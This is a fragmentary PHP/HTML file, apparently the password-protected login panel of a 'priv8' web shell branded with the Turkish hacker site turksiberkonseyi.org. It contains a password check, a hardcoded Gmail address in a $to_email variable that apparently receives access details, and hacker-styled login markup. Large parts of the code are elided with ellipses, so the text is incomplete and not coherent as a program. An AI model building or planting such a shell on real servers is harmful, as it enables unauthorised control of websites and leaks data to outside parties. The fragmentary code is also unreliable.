...
if ($admin['check']) {
    if ($doing == 'login') {
        if ($admin['pass'] == $password) {
            ...
            $to_email       = 'beyazhacker567@gmail.com';
			//
...
<div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
				<table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
				 ...
				 <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
				   turksiberkonseyi.org lütfen bekleyiniz !!  <img src="http://i382.photobucket.com/albums/oo263/vnhacker/loading.gif">
				  </div>
				</td>
					</tr>
				</table>
...
input, textarea, button
{
	...
	border-bottom: 2px dashed #8B0000;
       ...
       <BR><BR>
<div align=center >
<fieldset style="border: 1px solid rgb(69, 69, 69); padding: 4px;width:450px;bgcolor:white;align:center;font-family:tahoma;font-size:10pt"><legend><font color=red><B>Gir Banaaaaaaaaaaaaa</b></font></legend>

<div>
<font color=#99CC33>
<font color=#33ff00>==[ <B>priv8/B> ]== </font><BR><BR>

<form method="POST" action="">
	<span style="font:10pt tahoma;">Şifre turksiberkonseyi.org giriş yapınız  : </span><input name="password" type="password" size="20">
	<input type="hidden" name="doing" value="login">
	<input type="submit" value="Login">
	</form>
<BR>
<B><font color=#FFFFFF>
<a href=http://turksiberkonseyi.org  target=_blank>priv8</a><BR></b>
</div>
	</fieldset>
</head>
</html>
